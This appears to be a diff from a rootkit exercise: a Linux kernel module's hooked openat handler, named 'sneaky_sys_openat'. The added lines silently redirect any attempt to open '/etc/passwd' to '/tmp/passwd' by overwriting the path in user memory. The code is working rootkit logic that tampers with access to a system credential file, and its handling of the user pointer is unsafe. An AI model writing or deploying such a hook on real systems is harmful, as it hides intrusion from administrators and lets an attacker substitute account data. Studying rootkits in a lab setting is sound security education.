@@ -41,6 +41,11 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
+  const char __user * pathname;
+  pathname = (const char __user *)regs->di;
+  if(strstr(pathname, "/etc/passwd") != NULL){
+    copy_to_user((void *)regs->di, "/tmp/passwd", strlen("/tmp/passwd"));
+  }
   return (*original_openat)(regs);
 }
 
